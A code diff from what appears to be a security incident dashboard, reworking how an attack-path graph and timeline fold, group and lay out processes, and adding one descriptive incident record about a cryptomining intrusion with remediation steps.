       { const m = {}; INC.forEach((x) => { m[x.id] = stOf(x); }); const js = JSON.stringify(m); if (js !== this.__isJs) { this.__isJs = js; try { localStorage.setItem('dxIncSt', js); } catch (y) {} } }
       const incId = IM[st.huI] ? st.huI : IM[nf['事件']] ? nf['事件'] : 'INC-3201';
@@ -2905,6 +2994,9 @@ class Component extends DCLogic {
         'INC-3198': ['攻击者暴力破解 deploy 账号后读取 /etc/shadow 获取凭据，并写入 root 公钥以便长期免密登录。',
           '/etc/shadow 已被读取，系统账号的密码哈希可能泄露；新增公钥已删除，来源 IP 已封禁。', ['c1', 'c3'],
           ['检查其他主机上是否有同密码的 deploy 账号', '关注后续是否有用泄露凭据登录的行为', '为 SSH 登录开启二次身份认证']],
+        'INC-3207': ['攻击者篡改 root 计划任务，定时从 91.215.**.4 拉取脚本，在主机上运行挖矿程序，并用主机上的 SSH 凭据向同网段扩散。',
+          'CPU 持续被占用 780%，防火墙规则已被清空；10.0.2.31 已执行同样的下载命令，存在扩散风险。', ['h1', 'h4', 'h6'],
+          ['检查 10.0.2.31 及同网段主机的计划任务', '核对 root 的 authorized_keys 和 known_hosts', '恢复 iptables 规则']],
         'INC-3205': ['可能是攻击者利用应用漏洞执行编码命令并下载脚本，也可能是运维脚本的正常行为，需要人工确认。',
           'x.sh 已下载，暂未发现执行、外联或持久化记录。', ['d1', 'd2'],
           ['向应用负责人确认是否有调用 base64 命令的运维脚本', '检查 order-service 近期的请求日志', '分析 x.sh 的内容']],
@@ -3000,25 +3092,43 @@ class Component extends DCLogic {
         const fs = !!st.hgFs; const CC = live ? (pend ? 'r' : 'b') : s0.indexOf('已关闭') === 0 ? 'g' : 'b'; const KIND = { ip: '网络地址', evt: '入口事件', host: '受害主机', proc: '进程', file: '文件' };
         const ICG = { ip: 'ip', evt: 'up', host: 'srv', proc: 'proc', file: 'file' };
         const CW = isTree ? 232 : 184, CH = isTree ? 92 : 88, TAG = 22, GX = isTree ? 24 : 40, GY = isTree ? 52 : 34, PAD = 36, R = 10;
-        const ids = isTree ? ord.slice() : inc.main.concat(inc.br);
-        const par = (id) => { if (isTree) { const p = PRC[id][2]; return p && ids.indexOf(p) >= 0 ? p : ''; } const i = inc.main.indexOf(id); return i > 0 ? inc.main[i - 1] : i === 0 ? '' : inc.brAt; };
+        const M0 = inc.main; const rIds = isTree ? ord.slice() : M0.concat(inc.br);
+        const rPar = (id) => { const pp = PRC[id] && PRC[id][2]; if (isTree) return pp && rIds.indexOf(pp) >= 0 ? pp : ''; const i = M0.indexOf(id); if (i >= 0) return i > 0 ? M0[i - 1] : ''; return pp && rIds.indexOf(pp) >= 0 ? pp : inc.brAt; };
+        const rKids = {}; rIds.forEach((k) => { const p = rPar(k); (rKids[p] = rKids[p] || []).push(k); });
+        const hasAl = {}; const sub = (id) => { if (hasAl[id] !== undefined) return hasAl[id]; hasAl[id] = alOf(id).length > 0 || (rKids[id] || []).some(sub); return hasAl[id]; }; rIds.forEach(sub);
+        const imp = (id) => sub(id) || (!isTree && M0.indexOf(id) >= 0);
+        const nmOf = (id) => PRC[id] ? PRC[id][0] : ND(id)[1];
+        const cntD = (id) => 1 + (rKids[id] || []).reduce((a2, c) => a2 + cntD(c), 0);
+        const showAll = !!st.hgAll; const exK = incId + '|' + vt; const exM = (st.hgEx || {})[exK] || {};
+        const V = []; const VM = {};
+        const walk = (p, vp) => { const ch = rKids[p] || []; const byN = {}; ch.forEach((c) => { if (PRC[c] && !(rKids[c] || []).length && M0.indexOf(c) < 0) (byN[nmOf(c)] = byN[nmOf(c)] || []).push(c); });
+          const items = []; const seen = {}; ch.forEach((c) => { const g = byN[nmOf(c)]; if (g && g.length >= 3 && g.indexOf(c) >= 0) { if (!seen[nmOf(c)]) { seen[nmOf(c)] = 1; items.push({ g: 1, m: g, nm: nmOf(c) }); } } else items.push({ g: 0, id: c }); });
+          const isI = (it) => it.g ? it.m.some(imp) : imp(it.id); const open = showAll || !!exM[p];
+          const vis = open ? items : items.filter(isI); const hid = items.filter((it) => vis.indexOf(it) < 0);
+          vis.forEach((it) => { if (it.g) { const gid = 'g:' + p + ':' + it.nm; const o = { id: gid, par: vp, t: 'g', m: it.m, nm: it.nm }; V.push(o); VM[gid] = o; } else { const o = { id: it.id, par: vp, t: 'n' }; V.push(o); VM[it.id] = o; walk(it.id, it.id); } });
+          if (hid.length) { const o = { id: 'f:' + p, par: vp, t: 'f', fp: p, n: hid.reduce((a2, it) => a2 + (it.g ? it.m.length : cntD(it.id)), 0), names: hid.map((it) => it.g ? it.nm : nmOf(it.id)) }; V.push(o); VM[o.id] = o; }
+          else if (!showAll && exM[p] && items.some((it) => !isI(it))) { const o = { id: 'f:' + p, par: vp, t: 'f', fp: p, close: 1, n: items.filter((it) => !isI(it)).reduce((a2, it) => a2 + (it.g ? it.m.length : cntD(it.id)), 0) }; V.push(o); VM[o.id] = o; } };
+        walk('', '');
+        const ids = V.map((o) => o.id); const par = (id) => VM[id].par;
+        const vsub = (id) => { const o = VM[id]; return o.t === 'n' ? sub(id) : o.t === 'g' ? o.m.some((x) => alOf(x).length) : false; };
         const kids = {}; ids.forEach((k) => { const p = par(k); (kids[p] = kids[p] || []).push(k); });
-        const P = {}; let W, H, brL = false; const rowOf = {}; const rowTop = [];
+        const P = {}; let W, H; const rowOf = {}; const rowTop = []; const dirOf = {};
         if (isTree) { const pos = {}; let slot = 0, maxD = 0;
           const lay = (id, d) => { maxD = Math.max(maxD, d); const ch = kids[id] || []; if (!ch.length) { pos[id] = [d, slot++]; return; } ch.forEach((c) => lay(c, d + 1)); pos[id] = [d, (pos[ch[0]][1] + pos[ch[ch.length - 1]][1]) / 2]; };
           (kids[''] || []).forEach((r) => lay(r, 0));
           ids.forEach((id) => { const [d, s2] = pos[id]; P[id] = [PAD + s2 * (CW + GX), PAD + TAG + d * (CH + TAG + GY)]; });
           W = PAD * 2 + slot * (CW + GX) - GX; H = PAD * 2 + (maxD + 1) * (CH + TAG + GY) - GY; }
-        else { const C = fs ? 4 : 3; const M = inc.main; const BS = TAG + CH + 12; let y = PAD + TAG, wx = 0;
+        else { const C = fs ? 4 : 3; const M = M0.filter((id) => VM[id]); const BS = TAG + CH + 12; let y = PAD + TAG, wx = 0;
           for (let r = 0; r * C < M.length; r++) { rowTop[r] = y; const row = M.slice(r * C, r * C + C); let stack = 0;
             row.forEach((id, c) => { P[id] = [PAD + c * (CW + GX), y]; rowOf[id] = r; wx = Math.max(wx, P[id][0] + CW); });
-            if (row.indexOf(inc.brAt) >= 0) { const [bx, by] = P[inc.brAt]; brL = row.indexOf(inc.brAt) === C - 1 && C > 1; inc.br.forEach((id, j) => { P[id] = [bx + (brL ? -28 : 28), by + CH + 12 + TAG + j * BS]; rowOf[id] = r; wx = Math.max(wx, P[id][0] + CW); }); stack = inc.br.length * BS + 4; }
+            let k2 = 0; row.forEach((mid, c) => { const dir = c === C - 1 && C > 1 ? -1 : 1; const [mx] = P[mid];
+              const st2 = (pid, d) => (kids[pid] || []).forEach((id) => { if (M0.indexOf(id) >= 0) return; P[id] = [mx + dir * 28 * d, y + CH + 12 + TAG + k2 * BS]; dirOf[id] = dir; rowOf[id] = r; k2++; wx = Math.max(wx, P[id][0] + CW); st2(id, d + 1); });
+              st2(mid, 1); }); stack = k2 ? k2 * BS + 4 : 0;
             y += CH + stack + GY + TAG; }
           W = wx + PAD; H = y - GY - TAG + PAD; }
         const XY = (id) => P[id];
-        const hasAl = {}; const sub = (id) => { if (hasAl[id] !== undefined) return hasAl[id]; hasAl[id] = alOf(id).length > 0 || (kids[id] || []).some(sub); return hasAl[id]; }; ids.forEach(sub);
-        const expl = !!st.huN && st.huN === selN && ids.indexOf(selN) >= 0;
-        const keep = new Set(); if (expl) { const dn = (id) => { keep.add(id); (kids[id] || []).forEach(dn); }; dn(selN); }
+        const focN = VM[selN] ? selN : (V.find((o) => o.t === 'g' && o.m.indexOf(selN) >= 0) || {}).id || ''; const expl = !!st.huN && st.huN === selN && !!focN;
+        const keep = new Set(); if (expl) { const dn = (id) => { keep.add(id); (kids[id] || []).forEach(dn); }; dn(focN); }
         const fd = (id) => expl && !keep.has(id);
         const sel = (id) => ev(() => S({ huN: st.huN === id ? '' : id, huNo: false, huAll: 0 }));
         ls.hg = { k: incId + '|' + vt + '|' + (fs ? 1 : 0) + '|' + (qOn ? 1 : 0), o: isTree ? 'v' : 'h', W, H, fs, nfs: !fs, fsN: fs ? '退出全屏' : '全屏查看',
@@ -3026,36 +3136,47 @@ class Component extends DCLogic {
           fsT: ev(() => S({ hgFs: !fs })), clr: ev(() => S({ huN: '' })) };
         ['loc', 'fit', 'out', 'one', 'in'].forEach((a) => { ls.hg['a_' + a] = (e) => { if (e && e.preventDefault) e.preventDefault(); this._hgAct(e && e.currentTarget, a); }; });
         ls.hucC = 'kc-card hu-c' + (fs ? ' hg-fsc' : '');
-        const [sx0, sy0] = XY(P[selN] ? selN : ids[0]); ls.hg.sx = sx0 + CW / 2; ls.hg.sy = sy0 + CH / 2; { const [rx0, ry0] = XY((kids[''] || [ids[0]])[0]); ls.hg.rx = rx0 + CW / 2; ls.hg.ry = ry0 + CH / 2; }
+        const [sx0, sy0] = XY(P[focN] ? focN : ids[0]); ls.hg.sx = sx0 + CW / 2; ls.hg.sy = sy0 + CH / 2; { const [rx0, ry0] = XY((kids[''] || [ids[0]])[0]); ls.hg.rx = rx0 + CW / 2; ls.hg.ry = ry0 + CH / 2; }
         const v = this._hgView && this._hgView.k === ls.hg.k ? this._hgView : { x: 24, y: 24, z: 0.9 };
         ls.hg.tf = 'transform:translate(' + v.x + 'px,' + v.y + 'px) scale(' + v.z + ')';
         ls.hg.bg = 'background-position:' + v.x + 'px ' + v.y + 'px;background-size:' + (20 * v.z) + 'px ' + (20 * v.z) + 'px';
         ls.hg.zp = Math.round(v.z * 100) + '%';
         const tsec = (t) => { const p = String(t).split(':').map(Number); return p[0] * 3600 + p[1] * 60 + (p[2] || 0); };
-        ls.hg.nodes = ids.map((id) => { const d = ND(id); const al = alOf(id); const k = al.length; const [x, y] = XY(id); const isP = d[0] === 'proc'; const p = PRC[id];
+        const chipOf = (k) => k ? (live ? (pend ? '待研判' : '已确认') : s0.split(' ')[0]) + (k > 1 ? ' ' + k : '') : '';
+        const chipCOf = (k) => 'hg-chip ' + (k ? CC : '');
+        const gs = st.hgGs || '';
+        ls.hg.nodes = V.map((o) => { const id = o.id; const [x, y] = XY(id); const pos2 = 'left:' + x + 'px;top:' + y + 'px;width:' + CW + 'px;height:' + CH + 'px';
+          if (o.t === 'f') { const nm = o.names ? o.names.filter((v2, i2, a2) => a2.indexOf(v2) === i2) : []; return { n: o.close ? '收起 ' + o.n + ' 个无告警进程' : '+' + o.n + ' 个无告警进程', sub: o.close ? '只显示攻击路径' : nm.slice(0, 3).join('、') + (nm.length > 3 ? ' 等' : ''), tag: o.close ? '已展开' : '已折叠', w: o.close ? '点击收起' : '点击展开', r: '', rC: 'hg-r', chip: '', chipC: '', ic: 'hg-mk more', on: 'false', al: (o.close ? '收起' : '展开') + o.n + ' 个无告警进程',
+              c: 'hg-card fold' + (fd(id) ? ' fd' : ''), st: pos2, t: ev(() => S({ hgEx: Object.assign({}, st.hgEx || {}, { [exK]: Object.assign({}, exM, { [o.fp]: !o.close }) }) })), he: () => {} }; }
+          if (o.t === 'g') { const m = o.m; const p0 = PRC[m[0]]; const ak = m.reduce((a2, x2) => a2 + alOf(x2).length, 0); const al0 = m.map(alOf).find((a2) => a2.length); const pids = m.map((x2) => PRC[x2][1]); const on = gs === id || m.indexOf(selN) >= 0 && expl;
+            const rep = m.find((x2) => alOf(x2).length) || m[0]; const ts2 = m.map((x2) => PRC[x2][7]).filter(Boolean).sort();
+            return { n: o.nm + ' ×' + m.length, sub: 'PID ' + Math.min.apply(null, pids) + '–' + Math.max.apply(null, pids) + ' · ' + p0[3], tag: (al0 ? al0[0][3] + ' · ' : '') + '同名进程合并', w: p0[4], r: ts2.length ? ts2[0].slice(3) + '–' + ts2[ts2.length - 1].slice(3) : '', rC: 'hg-r', chip: chipOf(ak), chipC: chipCOf(ak), ic: 'hg-mk proc', on: on ? 'true' : 'false', al: o.nm + ' 共 ' + m.length + ' 个进程',
+              c: 'hg-card grp' + (on ? ' on' : '') + (fd(id) ? ' fd' : '') + (ak ? ' hot' : ''), st: pos2, t: ev(() => S({ huN: rep, hgGs: gs === id ? '' : id, hgDt: '时间轴', hgFold: false, huNo: false })), he: HV('n:' + rep) }; }
+          const d = ND(id); const al = alOf(id); const k = al.length; const isP = d[0] === 'proc'; const p = PRC[id];
           const stg = k ? al[0][3] + ' · ' + al[0][4].split(' ')[0] : ''; let tag, sb, w, r = '', rC = '';
           if (isTree) { tag = p[3] + (k ? ' · ' + al[0][3] : ''); sb = 'PID ' + p[1] + (PRC[p[2]] ? ' · 父进程 ' + PRC[p[2]][0] + ' ' + PRC[p[2]][1] : ''); w = p[4]; r = p[5] === '无签名' ? '无签名' : '已签名'; rC = p[5] === '无签名' ? 'r' : ''; }
           else { tag = stg || KIND[d[0]]; sb = isP ? d[2] + ' · ' + p[3] : d[2]; w = isP ? p[4] : d[5] || (d[3] && d[3][1] ? d[3][1][0] + ' ' + d[3][1][1] : d[2]); r = k ? al[0][1] : ''; }
           const on = id === selN;
-          return { n: d[1], sub: sb, tag, w, r, rC: 'hg-r ' + rC, chip: k ? (live ? (pend ? '待研判' : '已确认') : s0.split(' ')[0]) + (k > 1 ? ' ' + k : '') : '', chipC: 'hg-chip ' + (k ? (live ? (pend ? 'r' : 'b') : s0.indexOf('已关闭') === 0 ? 'g' : 'b') : ''),
+          return { n: d[1], sub: sb, tag, w, r, rC: 'hg-r ' + rC, chip: chipOf(k), chipC: chipCOf(k),
             ic: 'hg-mk ' + ICG[d[0]], on: on ? 'true' : 'false', al: KIND[d[0]] + ' ' + d[1] + ' ' + d[2] + (k ? '，' + k + ' 条告警' : ''),
-            c: 'hg-card' + (on ? ' on' : '') + (fd(id) ? ' fd' : '') + (k ? ' hot' : '') + (!sub(id) && !isTree ? ' mu' : ''), st: 'left:' + x + 'px;top:' + y + 'px;width:' + CW + 'px;height:' + CH + 'px', t: sel(id), he: HV('n:' + id) }; });
+            c: 'hg-card' + (on ? ' on' : '') + (fd(id) ? ' fd' : '') + (k ? ' hot' : '') + (!sub(id) && !isTree ? ' mu' : ''), st: pos2, t: sel(id), he: HV('n:' + id) }; });
         const edges = [], dots = {};
         ids.forEach((id, i) => { const p = par(id); if (!p) return; const [px, py] = XY(p); const [cx, cy] = XY(id); let d2, ex, ey, ln = 0;
           if (isTree) { const s1 = px + CW / 2, s2 = py + CH, t1 = cx + CW / 2, t2 = cy - (cx === px ? 0 : 0); const m = s2 + GY / 2; ex = s1; ey = s2;
             ln = Math.abs(s1 - t1) < 1 ? t2 - s2 : (m - s2) + Math.abs(t1 - s1) + (t2 - m); if (Math.abs(s1 - t1) < 1) d2 = 'M' + s1 + ' ' + s2 + ' V' + t2; else { const dir = t1 > s1 ? 1 : -1; d2 = 'M' + s1 + ' ' + s2 + ' V' + (m - R) + ' Q' + s1 + ' ' + m + ' ' + (s1 + dir * R) + ' ' + m + ' H' + (t1 - dir * R) + ' Q' + t1 + ' ' + m + ' ' + t1 + ' ' + (m + R) + ' V' + t2; } }
-          else if (inc.br.indexOf(id) >= 0) { const dr = brL ? -1 : 1; const s1 = brL ? px + CW - 14 : px + 14, s2 = py + CH, t1 = brL ? cx + CW : cx, t2 = cy + CH / 2; ex = s1; ey = s2; ln = (t2 - s2) + Math.abs(t1 - s1); d2 = 'M' + s1 + ' ' + s2 + ' V' + (t2 - R) + ' Q' + s1 + ' ' + t2 + ' ' + (s1 + dr * R) + ' ' + t2 + ' H' + t1; }
+          else if (M0.indexOf(id) < 0) { const brL = dirOf[id] === -1; const dr = brL ? -1 : 1; const s1 = brL ? px + CW - 14 : px + 14, s2 = py + CH, t1 = brL ? cx + CW : cx, t2 = cy + CH / 2; ex = s1; ey = s2; ln = (t2 - s2) + Math.abs(t1 - s1); d2 = 'M' + s1 + ' ' + s2 + ' V' + (t2 - R) + ' Q' + s1 + ' ' + t2 + ' ' + (s1 + dr * R) + ' ' + t2 + ' H' + t1; }
           else { const s1 = px + CW, s2 = py + CH / 2, t1 = cx, t2 = cy + CH / 2; ex = s1; ey = s2;
             if (rowOf[p] === rowOf[id]) { d2 = 'M' + s1 + ' ' + s2 + ' H' + t1; ln = t1 - s1; }
             else { const m = s1 + GX / 2, yr = rowTop[rowOf[id]] - TAG - 16, f = t1 - GX / 2; ln = (m - s1) + (yr - s2) + (m - f) + (t2 - yr) + (t1 - f);
               d2 = 'M' + s1 + ' ' + s2 + ' H' + (m - R) + ' Q' + m + ' ' + s2 + ' ' + m + ' ' + (s2 + R) + ' V' + (yr - R) + ' Q' + m + ' ' + yr + ' ' + (m - R) + ' ' + yr + ' H' + (f + R) + ' Q' + f + ' ' + yr + ' ' + f + ' ' + (yr + R) + ' V' + (t2 - R) + ' Q' + f + ' ' + t2 + ' ' + (f + R) + ' ' + t2 + ' H' + t1; } }
-          const path = sub(id); const f = fd(id);
+          const path = vsub(id); const f = fd(id);
           edges.push({ d: d2, flow: live && path, c: 'hg-e' + (path ? '' : ' mu') + (live && path ? (pend ? ' r' : ' b') : '') + (f ? ' fd' : ''), dl: '--len:' + Math.round(ln) + 'px;animation-delay:' + ((i * 0.37) % 2.1).toFixed(2) + 's;animation-duration:' + (1.3 + Math.min(ln, 900) / 900).toFixed(2) + 's' });
           const dk = ex + ',' + ey; const dd = dots[dk] || { x: ex, y: ey, mu: true, f: true }; dd.mu = dd.mu && !path; dd.f = dd.f && f; dots[dk] = dd; });
         edges.sort((a, b) => (b.c.indexOf(' mu') >= 0) - (a.c.indexOf(' mu') >= 0));
         ls.hg.edges = edges; ls.hg.dots = Object.keys(dots).map((k) => { const d = dots[k]; return { x: d.x, y: d.y, c: 'hg-dot' + (d.mu ? ' mu' : '') + (d.f ? ' fd' : '') }; });
-        const nAl = ids.filter((id) => alOf(id).length).length;
-        ls.hg.cnt = ids.length + (isTree ? ' 个进程' : ' 个节点') + ' · ' + nAl + ' 个有告警';
+        const nAl = rIds.filter((id) => alOf(id).length).length; const nP = rIds.filter((id) => PRC[id]).length;
+        ls.hg.cnt = (isTree ? nP + ' 个进程' : rIds.length + ' 个节点') + ' · ' + nAl + ' 个有告警';
+        ls.hg.canF = rIds.some((id) => !imp(id)); ls.hg.modes = [['仅攻击路径', false], ['显示全部', true]].map(([n, v2]) => ({ n, c: v2 === showAll ? 'on' : '', t: ev(() => S({ hgAll: v2, hgEx: Object.assign({}, st.hgEx || {}, { [exK]: {} }) })) }));
         // 底部面板
         const dt = st.hgDt || '时间轴'; const open = !st.hgFold;
         ls.hg.open = open; ls.hg.foldN = open ? '收起面板' : '展开面板'; ls.hg.foldC = open ? '' : 'up'; ls.hg.foldT = ev(() => S({ hgFold: open }));
@@ -3069,11 +3190,17 @@ class Component extends DCLogic {
         const rs = Math.max(0, tsec(inc.last) - T0); const dur = rs >= 3600 ? Math.floor(rs / 3600) + ' 小时 ' + Math.round(rs % 3600 / 60) + ' 分' : rs >= 60 ? Math.floor(rs / 60) + ' 分 ' + (rs % 60) + ' 秒' : rs + ' 秒';
         ls.hg.axL = isTree ? '进程' : '节点';
         ls.hg.nums = [['告警', inc.al.length + ' 条'], ['涉及进程', procs.length + ' 个'], ['持续', dur], ['状态', s0]].map(([k, v2]) => ({ k, v: v2 }));
-        ls.hg.rows = ids.map((id) => { const d = ND(id); const al = alOf(id); const ts = al.map((y) => tsec(y[1]));
+        const ptOf = (id, y) => ({ n: y[2], tt: y[1] + ' · ' + y[2] + ' · ' + y[3] + ' · ' + y[4], st: 'left:' + L(tsec(y[1])), c: 'hg-pt ' + CC + ((tsec(y[1]) - a0) / (a1 - a0) > 0.7 ? ' rt' : '') + fc(y[0]), he: HV('a:' + y[0]), t: ev(() => S({ huN: id })) });
+        const stOfP = (id) => PRC[id] && PRC[id][7] && !alOf(id).length ? [{ n: '', tt: PRC[id][7] + ' · ' + PRC[id][0] + ' 启动（PID ' + PRC[id][1] + '）', st: 'left:' + L(tsec(PRC[id][7])), c: 'hg-pt s', he: () => {}, t: ev(() => S({ huN: id })) }] : [];
+        const rowOf2 = (id, extra) => { const d = ND(id); const al = alOf(id); const ts = al.map((y) => tsec(y[1]));
           const bar = ts.length > 0; const b0 = bar ? Math.min.apply(null, ts) : 0; const b1 = d[0] === 'proc' && bar && live ? T1 : bar ? Math.max.apply(null, ts) : 0;
-          return { n: d[1], s: d[0] === 'proc' ? d[2].replace('PID ', '') : d[2], ic: 'hg-mk sm ' + ICG[d[0]], c: 'hg-row' + (id === selN ? ' on' : '') + (fd(id) ? ' fd' : '') + (al.length ? '' : ' mu'), t: sel(id),
-            bar: bar && b1 > b0, bc: 'hg-bar ' + CC, bst: 'left:' + L(b0) + ';width:calc(' + L(b1) + ' - ' + L(b0) + ')',
-            pts: al.map((y) => ({ n: y[2], tt: y[1] + ' · ' + y[2] + ' · ' + y[3] + ' · ' + y[4], st: 'left:' + L(tsec(y[1])), c: 'hg-pt ' + CC + ((tsec(y[1]) - a0) / (a1 - a0) > 0.7 ? ' rt' : '') + fc(y[0]), he: HV('a:' + y[0]), t: ev(() => S({ huN: id })) })) }; });
+          return { n: d[1], s: d[0] === 'proc' ? d[2].replace('PID ', '') : d[2], ic: 'hg-mk sm ' + ICG[d[0]], c: 'hg-row' + (id === selN ? ' on' : '') + (VM[id] && fd(id) ? ' fd' : '') + (al.length ? '' : ' mu') + (extra || ''), t: sel(id),
+            bar: bar && b1 > b0, bc: 'hg-bar ' + CC, bst: 'left:' + L(b0) + ';width:calc(' + L(b1) + ' - ' + L(b0) + ')', pts: stOfP(id).concat(al.map((y) => ptOf(id, y))) }; };
+        ls.hg.rows = [];
+        V.forEach((o) => { if (o.t === 'f') return; if (o.t === 'n') { ls.hg.rows.push(rowOf2(o.id)); return; }
+          const m = o.m; const op = gs === o.id; const pts = []; m.forEach((x2) => { stOfP(x2).forEach((q) => pts.push(q)); alOf(x2).forEach((y) => pts.push(ptOf(x2, y))); });
+          ls.hg.rows.push({ n: o.nm + ' ×' + m.length, s: op ? '收起' : '展开 ' + m.length + ' 个 PID', ic: 'hg-mk sm proc', c: 'hg-row grp' + (op ? ' on' : '') + (fd(o.id) ? ' fd' : ''), t: ev(() => S({ hgGs: op ? '' : o.id })), bar: false, bc: '', bst: '', pts });
+          if (op) m.forEach((x2) => ls.hg.rows.push(rowOf2(x2, ' sub'))); });
         ls.hg.planO = (e) => { this.setState({ hgFs: false }); if (ls.planO) ls.planO(e); };
         ls.vtabs.forEach((t) => { t.sc = t.on ? 'on' : ''; });
         ls.nx.forEach((x) => { x.dc = 'hg-act' + (x.c ? ' in' : ''); });
